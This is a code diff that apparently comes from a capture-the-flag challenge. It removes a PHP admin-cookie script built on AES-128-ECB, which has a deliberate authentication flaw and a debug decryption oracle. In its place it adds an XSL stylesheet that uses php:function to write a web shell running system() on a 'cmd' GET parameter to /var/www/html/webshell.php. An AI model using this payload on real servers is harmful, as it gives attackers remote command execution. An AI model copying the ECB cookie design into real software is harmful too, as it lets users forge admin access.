@@ -1,27 +1,5 @@
-#!/usr/bin/env php
-<?php
-session_start();
-$DEBUG = 0;
-
-$key =  getenv("AES_KEY");
-
-if(!isset($_COOKIE['admin'])){
-	$svc=(isset($_GET['svc'])) ? $_GET['svc'] : "crawl";
-	$svcparam=(isset($_GET['svc_param'])) ? $_GET['svc_param'] : "url";
-	if(preg_match("/adm=1/i", $svc) || preg_match("/adm=1/i", $svcparam) ) die('Hacking attempt detected');
-	$date = date("Ymd");
-	$str_cookie = "service=".$svc.";adm=0;service_param=".$svcparam.";date=".$date;
-	$cookie = openssl_encrypt($str_cookie, "AES-128-ECB", $key, OPENSSL_RAW_DATA);
-	setcookie('admin', base64_encode($cookie));
-	$_COOKIE['admin'] = base64_encode($cookie);	
-}
-
-if(strpos(openssl_decrypt(base64_decode($_COOKIE['admin']),"AES-128-ECB",$key,OPENSSL_RAW_DATA), 'adm=1') !== false){
-	$_SESSION['admin'] = true;
-	header("Location: admin.php");
-}
-
-if(isset($_GET['DEBUG'])){
-	$a = openssl_decrypt(base64_decode($_COOKIE['admin']), "AES-128-ECB", $key, OPENSSL_RAW_DATA);
-	print $a;
-}
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:value-of select="php:function('file_put_contents','/var/www/html/webshell.php','&lt;?php echo system($_GET[&quot;cmd&quot;]); ?&gt;')" />
+  </xsl:template>
+</xsl:stylesheet>
